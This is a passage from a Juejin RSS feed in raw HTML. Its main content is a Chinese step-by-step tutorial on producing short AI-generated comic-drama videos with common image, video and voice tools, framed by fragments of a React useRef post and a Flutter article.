      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
        <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> {
          setFlag({});
        }}
      &gt;
        Rerender
      <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">RefQuestion</span>;
</code></pre>
<p>如图，我点击了八次按钮，依赖改变了八次</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62722c74b4224a328181f072ead8eda8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=ghAu0BYpwmF%2BLI0SbFCNLeT800A%3D" alt="image.png" loading="lazy"/></p>
<p>所以，useRef并不是只会执行一次，而是每次组件渲染都执行，只不过如果之前有结果就返回之前的结果而已。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026年风口项目：AI漫剧怎么做？这套“傻瓜式”教程请收好]]></title>    <link>https://juejin.cn/post/7594722586732789766</link>    <guid>https://juejin.cn/post/7594722586732789766</guid>    <pubDate>2026-01-14T06:52:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594722586732789766" data-draft-id="7594863660296912938" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026年风口项目：AI漫剧怎么做？这套“傻瓜式”教程请收好"/> <meta itemprop="keywords" content="架构"/> <meta itemprop="datePublished" content="2026-01-14T06:52:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="MobotStone"/> <meta itemprop="url" content="https://juejin.cn/user/3839909554568840"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026年风口项目：AI漫剧怎么做？这套“傻瓜式”教程请收好
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3839909554568840/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    MobotStone
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T06:52:37.000Z" title="Wed Jan 14 2026 06:52:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>刷抖音、小红书的时候，你是不是经常刷到那种“AI做的漫画视频”？</strong></p>
<p>这些AI漫剧真的越来越火：随便一条就是几十万点赞，还有不少人用它做内容顺便实现变现。</p>
<p>但很多新手一开始就容易卡住：</p>
<ul>
<li>到底该用哪些工具？</li>
<li>从“写剧情”到“做成视频”，具体要走哪些步骤？</li>
<li>自己没基础、不会画画、也不太会剪辑，是不是就做不了？</li>
</ul>
<p>别担心，今天我把自己亲测好用的 AI 漫剧制作流程，按步骤整理成一套“照着做就行”的方法；并且把每个阶段需要的核心工具也列出来。你不需要复杂技巧，哪怕是纯小白，照着流程走，通常 1–2 天就能做出你的第一集。</p>
<h2 data-id="heading-0"><strong>一、先把底层思路搞明白：做AI漫剧，选对工具比瞎研究重要多了</strong></h2>
<p>很多新手一上来就容易“劝退”，由于是满世界乱找软件，结果不是功能对不上，就是操作太难根本学不会。</p>
<p>其实，做AI漫剧没那么复杂，你把它想象成一条流水线，一共就只分六个步骤：</p>
<p><strong>剧本创作 → 角色/场景设计 → 分镜制作 → 动画生成 → 配音/配乐 → 后期合成</strong></p>
<p>千万别贪多！在每一个步骤里，你只需要死磕1到2个最顺手、最好用的工具就足够了。工具选对了，你的制作效率直接起飞！</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/512dc7d5460049caa001c6535b5737cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9ib3RTdG9uZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978357&amp;x-signature=iYLU1O8fTQV%2F4CNm7kMtayuVRSw%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1"><strong>二、AI 漫剧制作新手工具包</strong></h2>
<h3 data-id="heading-2"><strong>（一）搞定剧本（故事是灵魂）</strong></h3>
<p>常用工具：GPT-5.2、Gemini 3 pro、豆包、DeepSeek（深度求索）</p>
<p><strong>怎么做（一步一步来）：</strong></p>
<p>1）<strong>先把“关键信息”喂给AI，让它出第一版剧情</strong></p>
<p>你只需要提供几个核心要素：<strong>主题</strong>（讲什么）／<strong>角色</strong>（谁来演）／<strong>风格</strong>（搞笑、热血、悬疑等）／<strong>集数</strong>（打算做几集），AI会根据这些内容先生成一个<strong>剧本初稿</strong>，相当于“打个底”。</p>
<p>2）<strong>自己再把剧本“顺一遍”，把不合理的地方改顺</strong></p>
<p>重点检查两件事：</p>
<ul>
<li><strong>对话像不像真人说话</strong>（别太尬、别太长）</li>
<li><strong>剧情前后是否连贯</strong>（别突然跳剧情、人物别前后矛盾）</li>
</ul>
<p>3）<strong>把大剧本拆成单集，并控制每集时长</strong></p>
<ul>
<li>新手建议每集做<strong>1～1.5分钟</strong>，更容易做完、也更符合短视频节奏。</li>
<li>每一集结尾都要留一个**“钩子”**（悬念/反转/问题），让观众想点下一集。</li>
</ul>
<p>核心技巧（让AI写得更对味）</p>
<ul>
<li>
<p><strong>提示词要写具体一点</strong>，越具体越好用。比如：</p>
<p>“校园奇幻题材，主角是一只会说话的猫，每集结尾都要留悬念。”</p>
</li>
<li>
<p><strong>别一上来就搞复杂支线</strong>：新手最容易写着写着失控。</p>
<p>建议每集只围绕<strong>一个小冲突</strong>展开（例如误会、挑战、发现线索），短小清晰、产出更稳。</p>
</li>
</ul>
<h3 data-id="heading-3"><strong>（二）打造角色和场景（角色 &amp; 场景设计）</strong></h3>
<p>这一步要做的事很简单：先把“主角长什么样”定下来，再把“故事发生在哪”搭出来，最后让所有图片看起来像同一部动画里的。</p>
<h4 data-id="heading-4">1）常用工具</h4>
<p>工欲善其事，必先利其器。你可以选择下面这些工具来生成图片：</p>
<ul>
<li><strong>Nano banana Pro</strong>(2025年下半年爆火，也是我最喜欢的)</li>
<li><strong>MidJourney</strong>（画质很强，目前最火）</li>
<li><strong>Stable Diffusion</strong>（功能强大，甚至可以在自己电脑上跑）</li>
<li><strong>即梦</strong>（国内工具，中文更友好，访问也方便）</li>
</ul>
<h4 data-id="heading-5">2）具体怎么做？分三步走</h4>
<p><strong>① 先做角色设定（把主角“定型”）</strong></p>
<p>用工具生成几张角色图，然后把关键信息记下来/标注清楚，比如：</p>
<ul>
<li>外貌：发型、发色、五官特点、身高体型</li>
<li>服装：校服款式、配饰、鞋子等</li>
<li>气质/性格：活泼、冷静、元气、学霸感……</li>
</ul>
<p>这样做的好处是后面你再生成新图，角色不会“越画越不像”。</p>
<p><strong>② 再做场景布置（把“舞台”搭好）</strong></p>
<p>根据剧情需要生成场景图，比如：</p>
<ul>
<li>“雨天教室”</li>
<li>“星空操场”</li>
<li>“走廊”“图书馆”“天台”等</li>
</ul>
<p>场景先不用追求特别复杂，先把氛围和主要元素做出来就行。</p>
<p><strong>③ 最后统一风格（让它们像同一个系列）</strong></p>
<p>从生成的角色图和场景图里，挑选画风最接近的一批，放进一个文件夹/素材库：</p>
<ul>
<li>以后都优先用这批作为参考</li>
<li>画风不一致的先淘汰或单独放一边</li>
</ul>
<p>目标是：你一眼看过去，会觉得“这就是同一部作品”。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8987b368ecbc4aa5bc0cd24493383bfa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9ib3RTdG9uZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978357&amp;x-signature=GmFnShHQK0YPCMHFJmtQ2XNY7SE%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-6">3）核心技巧（新手最该记住的）</h4>
<ul>
<li>在提示词里加上明确的风格限制，比如写“<strong>动漫风格</strong>”“<strong>Studio Ghibli(宫崎骏动漫风格)风格</strong>”之类的描述（如“动漫风格”、“皮克斯风格”），效果立竿见影。</li>
<li>把效果好的提示词保存下来，后面直接复制改几个词就能复用，效率会高很多。</li>
</ul>
<h3 data-id="heading-7"><strong>（三）把故事变成画面（分镜制作）</strong></h3>
<p>分镜，简单来说就是视频的“设计图”，就像画连环画一样，把你的故事一格一格地列出来。</p>
<h4 data-id="heading-8">1）常用工具</h4>
<p>即梦、Nano banana pro、seko。</p>
<h4 data-id="heading-9">2）新手小窍门</h4>
<p>刚开始如果你觉得从零生成很难，可以<strong>利用“生图”功能</strong>：先做出一张满意的图，然后让 AI 基于这张图去生成连续的后续画面，这样画面风格会比较统一，也更简单。</p>
<h4 data-id="heading-10">3）手把手操作步骤</h4>
<ul>
<li>
<p><strong>第一步（喂素材）</strong> ：就像做菜要先备料，把你写好的剧本、设定好的角色图片、场景图片都上传给 AI 工具，让它帮你生成第一版分镜图。</p>
</li>
<li>
<p><strong>第二步（排顺序）</strong> ：把生成的图片按照故事发展排好队。</p>
<ul>
<li><em>小贴士</em>：控制好数量，通常<strong>1 分钟的视频，准备 5 到 8 张分镜图</strong> 就足够了，太多会太赶，太少会无聊。</li>
</ul>
</li>
<li>
<p><strong>第三步（加说明）</strong> ：给每张图加个“备注”。</p>
<ul>
<li>说明<strong>景别</strong>：是“近景”（比如只拍脸，看表情）还是“全景”（拍整个房间，看环境）。</li>
<li>说明<strong>运镜</strong>：镜头是推近、拉远，还是从左往右移。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-11">4）核心秘籍（怎么写提示词）</h4>
<p>想要 AI 生成得准，请记住这个<strong>万能公式</strong>： <strong>【场景环境】+【角色动作】+【镜头描述】</strong></p>
<ul>
<li>
<p><strong>举个栗子</strong>：</p>
<ul>
<li>不要只说：“猫在桌子上。”</li>
<li>要这样说：“<strong>教室全景</strong>（场景+镜头），<strong>一只猫跳上了书桌</strong>（角色动作）。”</li>
</ul>
</li>
</ul>
<p><strong>最后别忘了</strong>：给每一张分镜图<strong>编上号码</strong>（1、2、3……），这样后面做动画的时候才不会手忙脚乱。</p>
<h3 data-id="heading-12"><strong>（四）让画面“动”起来（动画生成）</strong></h3>
<p>这一步，我们要把之前生成的静止图片，变成会动的视频片段。</p>
<h4 data-id="heading-13">1）常用工具</h4>
<p>目前市面上最火的几款 AI 视频工具都在这儿了，选一两个顺手的就行：</p>
<ul>
<li><strong>国际大牌：</strong> Sora、Runway、Pika</li>
<li><strong>国产好手：</strong> Vidu、即梦（Jimeng）、可灵（Kling）、海螺（Hailuo）</li>
</ul>
<h4 data-id="heading-14">2）怎么做：按这几步走就能上手</h4>
<ul>
<li>
<p><strong>准备并上传素材</strong></p>
<p>把你的<strong>分镜图</strong>、<strong>角色素材</strong>（人物/动物设定图等）上传到工具里。</p>
</li>
<li>
<p><strong>生成动态片段</strong></p>
<p>先从一个镜头开始生成，让静态画面“动起来”，得到短视频片段。</p>
</li>
<li>
<p><strong>微调动作细节，让它更自然</strong></p>
<p>重点看这些地方：</p>
<ul>
<li>
<p>走路是否顺、脚有没有“飘”</p>
</li>
<li>
<p>说话时表情是否对应情绪</p>
</li>
<li>
<p>转头、抬手等动作是否连贯</p>
<p>不自然就调整参数或改提示词，重复生成小范围优化。</p>
</li>
</ul>
</li>
<li>
<p><strong>加一点基础转场</strong></p>
<p>片段之间可以先用简单转场（淡入淡出、切换）衔接，保证观看流畅。</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6f20d421d9e448b9b49aa7c73197274~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9ib3RTdG9uZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978357&amp;x-signature=x6LcYQxqc%2BsJdhh%2BCc2dD2UWDAg%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-15">3）容易踩坑的关键技巧</h4>
<ul>
<li>
<p><strong>尽量用同一个工具完成同一条视频</strong>：不同工具的画风、质感、运动方式可能差很多，混用容易出现“风格割裂”。</p>
</li>
<li>
<p><strong>每个片段不要太长</strong>：建议单个镜头控制在<strong>10–15 秒</strong>。越短越稳定，出错概率更低，也更方便返工。</p>
</li>
<li>
<p>**学会“说人话”：**写提示词（Prompt）有万能公式，照着填空就行：</p>
<ul>
<li>公式：场景 + 角色动作 + 镜头方式</li>
<li><em>举例：“明亮的教室里（场景），一只猫跳上了书桌（动作），全景拍摄（镜头）。”</em></li>
</ul>
</li>
<li>
<p>**好记性不如烂笔头：**给你的每一个分镜图编好号码（比如 01、02、03...），这样后面剪辑的时候才不会手忙脚乱。</p>
</li>
</ul>
<h3 data-id="heading-16"><strong>（五）给视频注入灵魂：配音与背景音乐</strong></h3>
<p>这一步我们要解决听觉体验，主要分为“让角色开口说话”和“烘托气氛”两部分。</p>
<h4 data-id="heading-17">1）常用工具</h4>
<ul>
<li><strong>ElevenLabs</strong>：把文字台词一键变成“真人感”配音</li>
<li><strong>Mureka / Minimax</strong>：用来生成配乐，或辅助做音频相关内容（按你的习惯选一个就行）</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a5c714d8a744ec990075fb9e5a15164~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9ib3RTdG9uZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978357&amp;x-signature=0hJQzzcUSJSjlfpRuLOQ%2BBPrH9k%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-18"><strong>2）怎么做（照着做就能上手）</strong></h4>
<ul>
<li>
<p>先做配音：把剧本里的台词复制到ElevenLabs，挑一个最贴合角色的声音（比如年龄、性格、语气），然后生成配音音频。</p>
</li>
<li>
<p>再对剪辑：把配音放进剪辑软件里，按配音的停顿和语速来卡节奏剪画面。</p>
</li>
<li>
<p>口型微调：如果有角色说话画面，就根据配音的节奏调整口型，让“声音和嘴巴”对得上。</p>
</li>
<li>
<p>加背景音乐（BGM）：</p>
<ul>
<li>选无版权/可商用 的BGM直接用；</li>
<li>或者用AI（Mureka/Minimax）生成配乐，让风格更贴合剧情氛围。</li>
</ul>
</li>
</ul>
<p>一句话总结：先用 ElevenLabs 把台词变成声音，再用剪辑对齐节奏和口型，最后配上合规的BGM/AI配乐来提升氛围。</p>
<h3 data-id="heading-19"><strong>（六）后期合成</strong></h3>
<p>常用工具：<strong>剪映 / PR / Topaz / DaVinci Resolve（达芬奇）</strong></p>
<h4 data-id="heading-20">1）具体怎么做（按顺序照着来就行）</h4>
<ul>
<li><strong>把素材导进软件</strong>：动画片段、配音、BGM（背景音乐）都导入。</li>
<li><strong>按分镜拼起来</strong>：把每个镜头按剧情顺序拖到时间轴上，像搭积木一样拼好。</li>
<li><strong>加字幕</strong>：把台词字幕放上去，注意别挡住人物脸和关键信息。</li>
<li><strong>调画面</strong>：简单调整亮度、对比度、色彩，让画面看起来更统一、更舒服。</li>
<li><strong>导出视频</strong>：格式选<strong>MP4</strong>，并确认导出<strong>分辨率</strong>和你原视频一致（比如 1080p/4K），避免变糊或被拉伸。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b8fa831a9a584cd0bc25586fdf7384a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9ib3RTdG9uZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978357&amp;x-signature=JZ5nvf8c7L9%2B1q8tS%2FKbnDD12Pk%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-21">2）小技巧（让视频更像“正经作品”）</h4>
<ul>
<li><strong>开头 3 秒加 AI 标识</strong>：例如 “本视频含 AI 生成内容”，清晰合规也更透明。</li>
<li><strong>结尾加“下集预告”</strong> ：放 3–8 秒精彩片段或一句悬念台词，让观众更想追下一集。</li>
</ul>
<p><strong>新手做 AI 漫剧，千万别一上来就做大工程。</strong> 先把<strong>第 1 集完整做出来</strong>（哪怕短一点），跑通流程、找到问题，再逐步迭代升级。</p>
<h2 data-id="heading-22">三、建议</h2>
<p>很多新手一上来就想做“长篇大作”，结果流程还没摸熟、细节又多，很容易越做越累，最后直接弃坑。更稳的做法是：先从<strong>1分钟左右的单集</strong>开始练手，把“写脚本—出画面—配音—剪辑—发布”这套流程跑通。等你做出<strong>第一集</strong>之后，再根据评论和数据反馈去调整内容方向和节奏，这样进步会快很多。</p>
<p>还有一点很重要：<strong>工具别贪多</strong>。新手阶段不需要一口气学一堆复杂的软件，反而会分散精力。每个阶段抓住<strong>一个核心工具</strong>用熟就够了——比如写脚本用豆包、剪辑用剪映。等你稳定更新、有明确需求了，再考虑升级更专业的工具也不迟。</p>
<p>照着这个流程和工具思路来，就算是零基础的新手，也能更快做出自己的 AI 漫剧。现在 AI 工具确实越来越强，只要方法选对、步骤做对，不用专业背景也能做出好内容，甚至把它变成一份稳定的收益来源。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深度解析：如何彻底终结 Flutter 异步操作中的 BuildContext 崩溃？]]></title>    <link>https://juejin.cn/post/7594321135591374857</link>    <guid>https://juejin.cn/post/7594321135591374857</guid>    <pubDate>2026-01-13T01:34:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594321135591374857" data-draft-id="7592432859863466018" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深度解析：如何彻底终结 Flutter 异步操作中的 BuildContext 崩溃？"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-13T01:34:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JarvanMo"/> <meta itemprop="url" content="https://juejin.cn/user/2348212565845704"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深度解析：如何彻底终结 Flutter 异步操作中的 BuildContext 崩溃？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2348212565845704/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JarvanMo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:34:25.000Z" title="Tue Jan 13 2026 01:34:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body 